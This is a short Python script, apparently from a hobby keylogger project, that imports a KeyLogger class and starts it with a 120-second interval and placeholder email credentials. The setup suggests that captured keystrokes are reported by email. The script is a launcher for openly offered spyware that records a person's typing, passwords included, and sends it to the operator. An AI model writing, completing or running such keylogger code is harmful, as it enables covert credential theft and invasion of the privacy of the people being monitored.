#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 10-07-2020
# Last Updated: 28-08-2020
# Operating System: Linux, Mac, and Windows
# Description: Program that uses the KeyLogger class written previously.

# Import the necessary libraries
from keylogger import KeyLogger

# Create an object of the keylogger class
my_keylogger = KeyLogger(120, <YOUR_EMAIL_ADDRESS>, <PASSWORD>)
my_keylogger.start()